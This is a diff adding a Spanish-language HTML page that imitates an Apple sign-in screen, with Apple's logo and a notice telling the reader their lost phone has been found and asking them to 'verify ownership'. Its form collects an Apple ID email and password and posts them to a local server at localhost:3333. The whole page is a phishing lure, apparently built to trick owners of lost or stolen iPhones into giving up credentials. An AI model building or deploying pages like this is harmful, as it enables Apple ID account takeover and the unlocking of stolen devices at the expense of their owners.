@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Estilo Apple</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Variables de diseño */
+        :root {
+            --bg-color: #f5f5f7;
+            --text-color: #1d1d1f;
+            --border-color: #d1d1d6;
+            --focus-color: #007aff;
+            --button-hover: #005bb5;
+            --input-bg: #ffffff;
+            --input-focus-bg: #e5e5ea;
+            --top-bar-bg: #ffffff;
+            --logo-size: 25px;
+            --search-bar-width: 400px;
+            --input-padding: 14px;
+            --top-bar-height: 40px; /* Reducido el tamaño de la barra superior */
+            --main-padding: 20px;
+            --button-radius: 12px;
+            --icon-size: 20px;
+            --alert-font-size: 14px; /* Reducir tamaño del texto del aviso */
+        }
+
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+        }
+
+        /* Barra superior */
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px; /* Reducción del padding para hacer la barra más compacta */
+            background-color: var(--top-bar-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            height: var(--top-bar-height);
+        }
+
+        .top-bar .logo img {
+            width: var(--logo-size);
+            height: auto;
+            margin-right: 20px;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: var(--input-bg);
+            border-radius: 30px;
+            padding: 0 10px;
+            width: var(--search-bar-width);
+            margin-right: 20px;
+        }
+
+        .search-bar input {
+            border: none;
+            padding: var(--input-padding);
+            width: 100%;
+            font-size: 16px;
+            border-radius: 30px;
+            outline: none;
+        }
+
+        .search-bar input:focus {
+            background-color: var(--input-focus-bg);
+        }
+
+        .search-bar button {
+            background-color: transparent;
+            border: none;
+            padding: 8px;
+            cursor: pointer;
+        }
+
+        .search-bar button i {
+            font-size: 18px;
+            color: var(--text-color);
+        }
+
+        .top-bar .icons i {
+            font-size: var(--icon-size);
+            cursor: pointer;
+            color: var(--text-color);
+            transition: color 0.3s;
+            margin-left: 20px;
+        }
+
+        .top-bar .icons i:hover {
+            color: var(--focus-color);
+        }
+
+        /* Contenedor principal */
+        .container {
+            padding: var(--main-padding);
+            max-width: 500px;
+            margin: 100px auto 0;
+            text-align: center;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .apple-icon img {
+            width: 200px;
+            height: auto;
+            display: block;
+            margin: 0 auto 30px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        /* Aviso con texto reducido */
+        .alert {
+            margin-bottom: 25px;
+            font-size: var(--alert-font-size);
+            color: #333;
+            text-align: center;
+            font-weight: normal;
+        }
+
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form input {
+            padding: var(--input-padding);
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--button-radius);
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            transition: border-color 0.3s, background-color 0.3s;
+        }
+
+        .form input:focus {
+            outline: none;
+            border-color: var(--focus-color);
+            background-color: var(--input-focus-bg);
+        }
+
+        .form button {
+            padding: var(--input-padding);
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            background-color: var(--focus-color);
+            border: none;
+            border-radius: var(--button-radius);
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .form button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .link a {
+            color: var(--focus-color);
+            text-decoration: none;
+        }
+
+        .link a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 30px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Barra superior -->
+    <div class="top-bar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Logo de Apple">
+        </div>
+
+        <div class="search-bar">
+            <input type="text" placeholder="Buscar...">
+            <button><i class="fas fa-search"></i></button>
+        </div>
+
+        <div class="icons">
+            <i class="fas fa-headset" title="Soporte"></i>
+            <i class="fas fa-shopping-cart" title="Carrito"></i>
+        </div>
+    </div>
+
+    <!-- Contenido principal -->
+    <div class="container">
+        <div class="apple-icon">
+            <img src="https://i.postimg.cc/tT7jZQth/0-E167544-8-F34-4-B82-A69-A-BD2-A9-A064-ADB.jpg" alt="Logo de Apple">
+        </div>
+
+        <!-- Aviso sencillo con texto reducido -->
+        <div class="alert">
+            ¡Tu teléfono ha sido encontrado!<br><br>
+            Para asegurarnos de que este dispositivo realmente te pertenece, necesitamos que ingreses tus datos para verificar la propiedad.
+        </div>
+
+        <h1>Inicia sesión con tu ID de Apple</h1>
+
+        <form class="form" action="http://localhost:3333/submit" method="POST">
+            <input type="email" name="email" placeholder="ID de Apple" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <div class="divider"></div>
+        <div class="link">
+            <a href="#">¿Olvidaste tu ID de Apple o contraseña?</a>
+        </div>
+    </div>
+</body>
+</html>
